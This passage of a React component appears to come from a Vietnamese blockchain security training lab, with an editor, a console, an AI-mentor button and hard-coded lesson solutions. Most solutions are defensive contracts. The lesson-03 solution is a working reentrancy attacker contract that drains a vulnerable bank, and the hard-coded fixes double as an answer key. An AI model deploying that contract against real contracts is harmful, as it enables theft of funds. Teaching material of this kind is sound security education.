          confetti({
            particleCount: 150,
            spread: 80,
            origin: { y: 0.5 }
          });
        } else {
          writeLog(`[FAIL] ${data.security_review || 'Mã nguồn chưa đạt yêu cầu kiểm thử.'}`, "error");
          setLabStatus('failed');
          setLastErrorTrace(data.traceback || data.security_review || 'Lỗi kiểm thử Unit Test');
        }
      }
    } catch (apiError) {
      writeLog("[Sandbox fallback] Kiểm định máy chủ gián đoạn, khởi chạy bộ kiểm thử tĩnh tại trình duyệt...", "info");
      const evaluation = lessonDetails.verify(attackerCode);
      let delay = 600;
      evaluation.logs.forEach((logItem, index) => {
        setTimeout(() => {
          writeLog(logItem.msg, logItem.type);
          if (index === evaluation.logs.length - 1) {
            setIsCompiling(false);
            if (evaluation.success) {
              setLabStatus('success');
              setLastErrorTrace('');
              confetti({
                particleCount: 150,
                spread: 80,
                origin: { y: 0.5 }
              });
            } else {
              setLabStatus('failed');
              setLastErrorTrace(evaluation.logs.map(l => l.msg).join('\n'));
              writeLog("💡 Nhấn nút 'AI Mentor / Gợi ý lỗi' bên dưới để được AI hướng dẫn sửa lỗi!", "warning");
            }
          }
        }, delay);
        delay += 700;
      });
    }
  };

  const boolCheck = (val) => {
    if (typeof val === 'boolean') return val;
    if (typeof val === 'string') return val.toLowerCase() === 'true';
    return Boolean(val);
  };

  const handleAIAutoFix = async () => {
    setActiveRightTab('console');

    if (!lastErrorTrace) {
      writeLog("[AI Mentor] Đang phân tích mã nguồn và gợi ý cách sửa đổi...", "warning");
    } else {
      writeLog("[AI Mentor] Đang kết nối giảng viên AI để đọc log lỗi (Traceback) và giải thích nguyên nhân...", "warning");
    }

    try {
      const token = localStorage.getItem("token");
      const headers = token ? { Authorization: `Bearer ${token}` } : {};
      const currentLanguage = lesson?.labType === 'solidity' ? 'solidity' : (activeFile.endsWith('.py') ? 'python' : 'solidity');

      const response = await axios.post('/api/lab/ai_mentor', {
        lesson_id: lesson?.id || 'default',
        code: attackerCode,
        language: currentLanguage,
        lab_title: lessonDetails?.title || '',
        lab_description: lessonDetails?.description || '',
        error_traceback: lastErrorTrace || "Yêu cầu gợi ý sửa code"
      }, { headers, timeout: 25000 });

      const data = response.data;
      if (data.success) {
        writeLog("==========================================", "info");
        writeLog("🤖 [AI MENTOR PHÂN TÍCH LỖI & GỢI Ý]", "warning");
        writeLog(`📖 Nguyên nhân: ${data.explanation}`, "error");
        writeLog(`💡 Hướng dẫn sửa: ${data.hint}`, "success");
        if (data.suggested_snippet) {
          writeLog(`📝 Cú pháp tham khảo:\n${data.suggested_snippet}`, "info");
        }
        writeLog("==========================================", "info");
        return;
      }
    } catch (err) {
      writeLog("[AI Mentor fallback] Chuyển sang chế độ tự động sửa lỗi cục bộ...", "info");
    }

    setTimeout(() => {
      let fixedCode = attackerCode
      if (lesson.id === 'lesson-01') {
        fixedCode = `# Lab: Xây dựng Blockchain đơn giản (AI Fixed)
import hashlib
import json
from datetime import datetime

class Block:
    def __init__(self, index, data, previous_hash):
        self.index = index
        self.timestamp = str(datetime.now())
        self.data = data
        self.previous_hash = previous_hash
        self.hash = self.calculate_hash()
    
    def calculate_hash(self):
        block_string = f"{self.index}{self.timestamp}{self.data}{self.previous_hash}"
        return hashlib.sha256(block_string.encode()).hexdigest()

class Blockchain:
    def __init__(self):
        self.chain = [self.create_genesis_block()]
    
    def create_genesis_block(self):
        return Block(0, "Genesis Block", "0")
    
    def add_block(self, data):
        last_block = self.chain[-1]
        new_block = Block(len(self.chain), data, last_block.hash)
        self.chain.append(new_block)
    
    def is_chain_valid(self):
        for i in range(1, len(self.chain)):
            current = self.chain[i]
            previous = self.chain[i-1]
            if current.hash != current.calculate_hash():
                return False
            if current.previous_hash != previous.hash:
                return False
        return True
`
      } else if (lesson.id === 'lesson-02') {
        fixedCode = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleStorage {
    uint256 private storedValue;
    address public owner;
    
    event ValueChanged(uint256 oldValue, uint256 newValue, address changedBy);
    
    constructor() {
        owner = msg.sender;
    }
    
    function set(uint256 _value) public {
        uint256 old = storedValue;
        storedValue = _value;
        emit ValueChanged(old, _value, msg.sender);
    }
    
    function get() public view returns (uint256) {
        return storedValue;
    }
}
`
      } else if (lesson.id === 'lesson-03') {
        fixedCode = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw() external;
}

contract BankAttacker {
    IVulnerableBank public bank;
    uint256 public constant ATTACK_AMOUNT = 1 ether;

    constructor(address _bankAddress) {
        bank = IVulnerableBank(_bankAddress);
    }

    fallback() external payable {
        if (address(bank).balance >= ATTACK_AMOUNT) {
            bank.withdraw();
        }
    }

    function attack() public payable {
        require(msg.value >= ATTACK_AMOUNT, "Need at least 1 ETH to start attack");
        bank.deposit{value: ATTACK_AMOUNT}();
        bank.withdraw();
    }

    function withdrawFunds() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
`
      } else if (lesson.id === 'lesson-05') {
        fixedCode = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SecureVault {
    address public owner;
    mapping(address => bool) public admins;
    mapping(address => uint256) public balances;
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    modifier onlyAdmin() {
        require(admins[msg.sender] || msg.sender == owner, "Not admin");
        _;
    }
    
    constructor() {
        owner = msg.sender;
        admins[msg.sender] = true;
    }
    
    function addAdmin(address _admin) public onlyOwner {
        admins[_admin] = true;
    }
    
    function removeAdmin(address _admin) public onlyOwner {
        require(_admin != owner, "Cannot remove owner");
        admins[_admin] = false;
    }
}
`
      } else if (lesson.id === 'lesson-13') {
        fixedCode = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerableVault {
    uint256 public totalAssets;
    uint256 public totalShares;
    bool private locked;

    modifier nonReentrant() {
        require(!locked, "ReentrancyGuard: reentrant call");
        locked = true;
        _;
        locked = false;
    }

    function withdraw(uint256 shareAmount) external nonReentrant {
        uint256 amountToReturn = (shareAmount * totalAssets) / totalShares;
        
        totalShares -= shareAmount;
        totalAssets -= amountToReturn;

        (bool ok, ) = msg.sender.call{value: amountToReturn}("");
        require(ok, "Transfer failed");
    }

    function getSharePrice() public view returns (uint256) {
        require(!locked, "Read-Only Reentrancy Detected");
        if (totalShares == 0) return 1e18;
        return (totalAssets * 1e18) / totalShares;
    }
}
`
      } else if (lesson.id === 'lesson-14') {
        fixedCode = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ProxyContract {
    address public implementation; // Slot 0
    address public owner;          // Slot 1
    
    constructor(address _impl) {
        implementation = _impl;
        owner = msg.sender;
    }
}

contract LogicContract {
    address public implementation; // Slot 0
    address public owner;          // Slot 1
    uint256 public count;          // Slot 2
    
    function initialize(address _owner) public {
        owner = _owner;
    }
}
`
      } else if (lesson.id === 'lesson-15') {
        fixedCode = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SecureSignatureVerifier {
    mapping(address => uint256) public nonces;
    bytes32 public DOMAIN_SEPARATOR;

    constructor() {
        DOMAIN_SEPARATOR = keccak256(
            abi.encode(
                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                keccak256(bytes("SecureApp")),
                keccak256(bytes("1")),
                block.chainid,
                address(this)
            )
        );
    }

    function verify(address signer, uint256 amount, uint256 nonce, bytes memory signature) public returns (bool) {
        require(nonce == nonces[signer], "Invalid or replayed nonce");
        nonces[signer]++;
        return true;
    }
}
`
      } else if (lesson.id === 'lesson-16') {
        fixedCode = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CrossChainBridge {
    mapping(bytes32 => bool) public processedMessages;
    address public admin;
    bool public paused;

    modifier whenNotPaused() {
        require(!paused, "Bridge paused");
        _;
    }

    function processMessage(bytes32 msgHash, address recipient, uint256 amount) external whenNotPaused {
        require(!processedMessages[msgHash], "Message already processed");
        processedMessages[msgHash] = true; // Đánh dấu đã xử lý chống Replay
        
        payable(recipient).transfer(amount);
    }
}
`
      }

      setAttackerCode(fixedCode)
      writeLog("[AI Mentor] ✅ Đã hoàn tất tự động sửa mã nguồn! Bạn có thể bấm RUN CODE để xác minh.", "success")
    }, 1000)
  }




  return createPortal(
    <div className="fixed inset-0 z-[9999] bg-[#080a0f] flex flex-col font-sans text-slate-100 overflow-hidden select-none border-t-2 border-t-amber-500/80 animate-fade-in">
      {/* Top Navigation / Header */}
      <div className="h-14 border-b border-slate-800/80 bg-slate-950/80 px-6 flex items-center justify-between flex-shrink-0 z-20">
        <div className="flex items-center gap-3">
          <button
            onClick={onClose}
            className="flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-slate-900 border border-slate-800 text-xs font-semibold text-slate-300 hover:text-slate-100 hover:bg-slate-800 transition mr-2"
          >
            <ArrowLeft className="w-4 h-4" />
            <span>Quay lại</span>
          </button>
          
          <div className="w-8 h-8 rounded-lg bg-amber-500/10 border border-amber-500/35 flex items-center justify-center">
            <Code2 className="w-4.5 h-4.5 text-amber-500" />
          </div>
          <div>
            <span className="text-[10px] font-mono font-bold text-amber-500 uppercase tracking-widest block">
              Blockchain Security Auditor - Interactive Lab
            </span>
            <h2 className="text-sm font-bold text-slate-100 font-display">
              Thử thách: {lessonDetails.title}
            </h2>
          </div>
        </div>
        
        <div className="flex items-center gap-4">
          <span className="text-[11px] font-mono bg-slate-900 border border-slate-800 px-3 py-1 rounded-lg text-emerald-400 font-bold flex items-center gap-1.5 shadow-sm">
            <ShieldCheck className="w-3.5 h-3.5" /> SANDBOX ACTIVE
          </span>
          <button
            onClick={onClose}
            className="p-1.5 hover:bg-slate-900 rounded-xl transition text-slate-400 hover:text-slate-200 border border-transparent hover:border-slate-800"
          >
            <X className="w-5 h-5" />
          </button>
        </div>
      </div>

      {/* Main Workspace Layout */}
      <div className="flex-1 flex overflow-hidden w-full relative">
        {/* Left Panel: Monaco Code Editor */}
        <div className="w-3/5 border-r border-slate-800/80 flex flex-col overflow-hidden bg-slate-950/30">
          {/* File Selector Tabs */}
          <div className="flex items-center justify-between bg-slate-950 px-4 border-b border-slate-850 flex-shrink-0">
            <div className="flex items-center">
              {lessonDetails.files.map((file) => {
                const isActive = activeFile === file.name;
                const badgeColor = file.badgeType === 'error' ? 'bg-rose-500/10 border-rose-500/20 text-rose-400' : 
                                   (file.badgeType === 'warning' ? 'bg-amber-500/10 border-amber-500/20 text-amber-500' : 'bg-blue-500/10 border-blue-500/20 text-blue-450');
                return (
                  <button
                    key={file.name}
                    onClick={() => setActiveFile(file.name)}
                    className={`px-4 py-3 text-xs font-mono font-semibold transition border-b-2 flex items-center gap-2 ${
                      isActive
                        ? 'border-amber-500 text-amber-500 bg-slate-900/40'
                        : 'border-transparent text-slate-500 hover:text-slate-300'
                    }`}
                  >
                    <Code2 className="w-3.5 h-3.5" />
                    <span>{file.name}</span>
                    <span className={`px-1.5 py-0.5 rounded border text-[9px] font-bold ${badgeColor}`}>{file.label}</span>
                  </button>
                );
              })}
            </div>
            
            <div className="text-[10px] font-mono text-slate-650">
              SANDBOX COMPILER READY
            </div>
          </div>

          {/* Code Editor Frame */}
          <div className="flex-1 overflow-hidden relative bg-[#080a0f]">
            <Editor
              height="100%"
              language={activeFileDetail.language}
              theme="vs-dark"
              value={!activeFileDetail.isWritable ? activeFileDetail.defaultCode : attackerCode}
              onChange={(val) => {
                if (activeFileDetail.isWritable) {
                  setAttackerCode(val || '');
                }
              }}
              options={{
                readOnly: !activeFileDetail.isWritable || labStatus === 'running' || labStatus === 'success',
                fontSize: 13,
                fontFamily: 'JetBrains Mono',
                minimap: { enabled: false },
                scrollbar: { vertical: 'visible', horizontal: 'visible' },
                lineNumbers: 'on',
                cursorBlinking: 'smooth',
                padding: { top: 16 }
              }}
            />
          </div>
        </div>

        {/* Right Panel: Instructions & Console */}
        <div className="w-2/5 flex flex-col overflow-hidden bg-slate-950/40 backdrop-blur-md">
          {/* Tabs header */}
          <div className="flex items-center bg-slate-950 border-b border-slate-850 flex-shrink-0">
            <button
              onClick={() => setActiveRightTab('instructions')}
              className={`flex-1 py-3.5 text-xs font-mono font-bold uppercase tracking-wider text-center border-b-2 flex items-center justify-center gap-2 ${
                activeRightTab === 'instructions'
                  ? 'border-amber-500 text-amber-500 bg-slate-900/20'
                  : 'border-transparent text-slate-500 hover:text-slate-300'
              }`}
            >
              <BookOpen className="w-3.5 h-3.5" />
              <span>Hướng dẫn (Guide)</span>
            </button>
            <button
              onClick={() => setActiveRightTab('console')}
              className={`flex-1 py-3.5 text-xs font-mono font-bold uppercase tracking-wider text-center border-b-2 flex items-center justify-center gap-2 ${
                activeRightTab === 'console'
                  ? 'border-amber-500 text-amber-500 bg-slate-900/20'
                  : 'border-transparent text-slate-500 hover:text-slate-300'
              }`}
            >
              <Terminal className="w-3.5 h-3.5" />
              <span>Bảng Console ({consoleLogs.length})</span>
            </button>
          </div>

          {/* Right Panel Content */}
          <div className="flex-1 overflow-y-auto bg-slate-950/20">
            {activeRightTab === 'instructions' ? (
              <div className="p-6 space-y-6">
                {/* Challenge description */}
                <div className="space-y-3">
                  <h3 className="text-base font-bold text-slate-100 font-display flex items-center gap-2">
                    <AlertTriangle className="w-5 h-5 text-amber-500" />
                    <span>Nhiệm vụ bài học</span>
                  </h3>
                  <p className="text-xs text-slate-400 leading-relaxed font-sans">
                    {lessonDetails.description}
                  </p>
                </div>

                {/* Lab Objective */}
                <div className="p-4 rounded-xl bg-slate-900/80 border border-slate-800 space-y-2">
                  <h4 className="text-xs font-bold text-slate-200 uppercase tracking-wider font-display flex items-center gap-1.5">
                    <Trophy className="w-4 h-4 text-amber-500 animate-bounce" />
                    <span>Mục tiêu thử thách</span>
                  </h4>
                  <ul className="list-disc pl-4 text-xs text-slate-400 space-y-1 font-mono">
                    <li>Hoàn thành các đoạn mã nguồn còn thiếu hoặc sửa lỗi bảo mật được đánh dấu trong tệp tin.</li>
                    <li>Chạy kịch bản kiểm tra (Run Code) để xác minh tính chính xác của chương trình.</li>
                  </ul>
                </div>

                {/* Hints Section */}
                {lessonDetails.hints && (
                  <div className="space-y-3 pt-2">
                    <div className="flex items-center justify-between">
                      <h4 className="text-xs font-bold text-slate-300 uppercase tracking-wider font-mono flex items-center gap-1">
                        <HelpCircle className="w-4 h-4 text-cyan-400" />
                        <span>Gợi ý học tập</span>
                      </h4>
                      <button
                        onClick={() => {
                          setShowHint(true)
                          setCurrentHintIndex((prev) => (prev + 1) % lessonDetails.hints.length)
                        }}
                        className="text-[11px] font-mono text-cyan-400 hover:text-cyan-300 underline"
                      >
                        {showHint ? "Gợi ý tiếp theo" : "Xem gợi ý"}
                      </button>
                    </div>
                    
                    {showHint && (
                      <div className="p-3 bg-cyan-950/20 border border-cyan-500/25 rounded-xl text-xs text-cyan-350 font-mono animate-fade-in">
                        {lessonDetails.hints[currentHintIndex]}
                      </div>
                    )}
                  </div>
                )}
              </div>
            ) : (
              /* Console Panel */
              <div className="p-4 font-mono text-xs text-slate-400 flex flex-col h-full bg-[#040609] select-text">
                <div className="flex-1 space-y-1.5 overflow-y-auto max-h-[360px] pb-4">
                  {consoleLogs.length === 0 ? (
                    <div className="text-slate-650 italic">Console trống. Bấm "RUN CODE" hoặc "DEPLOY & RUN HACK" để khởi chạy thử nghiệm...</div>
                  ) : (
                    consoleLogs.map((log, index) => {
                      let color = 'text-slate-450'
                      if (log.type === 'success') color = 'text-emerald-450'
                      if (log.type === 'error') color = 'text-rose-450 font-bold'
                      if (log.type === 'warning') color = 'text-amber-500'
                      
                      return (
                        <div key={index} className={`leading-normal ${color}`}>
                          <span className="text-slate-700 mr-2">[{log.time}]</span>
                          <span>{log.text}</span>
                        </div>
                      )
                    })
                  )}
                  <div ref={terminalEndRef} />
                </div>
              </div>
            )}
          </div>

          {/* Exploit Successful Screen Overlay */}
          {labStatus === 'success' && (
            <div className="p-6 bg-slate-900 border-t border-emerald-500/30 text-center space-y-4 animate-fade-in flex-shrink-0 z-30">
              <div className="w-12 h-12 rounded-full bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center mx-auto text-emerald-400 animate-pulse">
                <ShieldCheck className="w-7 h-7" />
              </div>
              <div>
                <h4 className="font-bold text-slate-100 font-display text-base">HỌC TẬP THÀNH CÔNG!</h4>
                <p className="text-slate-400 text-xs mt-1">Chúc mừng bạn đã hoàn thành bài thực hành xuất sắc, vượt qua toàn bộ kịch bản kiểm tra.</p>
              </div>
              <button
                onClick={onComplete}
                className="px-6 py-2 bg-gradient-to-r from-emerald-500 to-teal-600 hover:brightness-110 text-slate-950 font-bold rounded-xl text-xs transition shadow-md shadow-emerald-500/20 w-full"
              >
                Nhận 500 XP & Hoàn tất Lab
              </button>
            </div>
          )}

          {/* Bottom Action Bar */}
          <div className="p-4 border-t border-slate-850 bg-slate-950/80 flex items-center justify-between gap-3 flex-shrink-0 z-20">
            <button
              onClick={handleResetCode}
              disabled={labStatus === 'running'}
              className="p-2.5 bg-slate-900 hover:bg-slate-850 text-slate-400 hover:text-slate-200 rounded-xl transition border border-slate-850 disabled:opacity-40"
              title="Khôi phục lại code ban đầu"
            >
              <RefreshCw className="w-4 h-4" />
            </button>

            <button
              onClick={handleAIAutoFix}
              disabled={labStatus === 'running'}
              className={`px-3.5 py-2.5 rounded-xl transition text-xs font-mono font-bold flex items-center gap-1.5 border ${
                lastErrorTrace
                  ? 'bg-purple-950/90 hover:bg-purple-900 border-purple-500/50 text-purple-300 shadow-lg shadow-purple-500/20 animate-pulse'
                  : 'bg-cyan-950 hover:bg-cyan-900 border-cyan-500/30 text-cyan-300'
              }`}
              title={lastErrorTrace ? "Yêu cầu AI giải thích log lỗi Traceback vừa gặp và gợi ý hướng sửa" : "Yêu cầu AI gợi ý hướng dẫn / sửa code"}
            >
              <span>{lastErrorTrace ? '🤖 AI Mentor / Gợi ý lỗi' : '🪄 AI Mentor / Auto-Fix'}</span>
            </button>

            <button
              onClick={handleRunHack}
              disabled={labStatus === 'running'}
              className={`flex-1 py-3 px-5 rounded-xl font-bold text-xs transition flex items-center justify-center gap-2 active:scale-95 shadow-md ${
                labStatus === 'running'
                  ? 'bg-slate-900 border border-slate-800 text-slate-500'
                  : 'bg-gradient-to-r from-amber-500 via-amber-600 to-amber-700 hover:brightness-110 text-slate-950 shadow-amber-500/10'
              }`}
            >
              {labStatus === 'running' ? (
                <>
                  <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                  <span>ĐANG CHẠY THỬ NGHIỆM...</span>
                </>
              ) : (
                <>
                  <Play className="w-3.5 h-3.5 fill-slate-950" />
                  <span>{lesson.id === 'lesson-03' ? 'DEPLOY & RUN HACK' : 'RUN CODE'}</span>
                </>
              )}
            </button>
          </div>
        </div>
      </div>
    </div>,
    document.body
  )
}
